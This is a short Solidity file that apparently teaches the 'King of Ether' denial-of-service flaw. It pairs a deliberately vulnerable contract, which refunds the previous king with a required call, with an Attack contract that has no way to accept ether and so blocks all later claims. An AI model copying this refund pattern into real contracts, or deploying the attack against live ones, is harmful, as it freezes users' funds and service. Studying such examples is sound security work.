// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// denial of service rejects to accept the ether
// In this you can becomes the king of the contract by sending more ethers to the contract than the previous king

contract KingOfEther{
    address public king;
    uint public balance;

    // alice sends 1 ether , king=alice ,balance=1 ether
    // bob sends 2 ether, king=bob ,balance=2 ether

    function claimThrone() external payable{
        // it checks the amount of ether sent greater than the previous amount
        require(msg.value>balance,"Need to pay more to become king");

        // if the amount is greater than the previous amount then king gets amount of ether he sent
        (bool sent,)=king.call{value:balance}("");
        require(sent,"Failed to sent ether");

        balance=msg.value;
        king=msg.sender;
    }

    function getBalance() public view returns (uint){
        return address(this).balance;
    }
}

contract Attack{
    function attack(KingOfEther kingOfEther) public payable{
        kingOfEther.claimThrone{value:msg.value}();
    }
}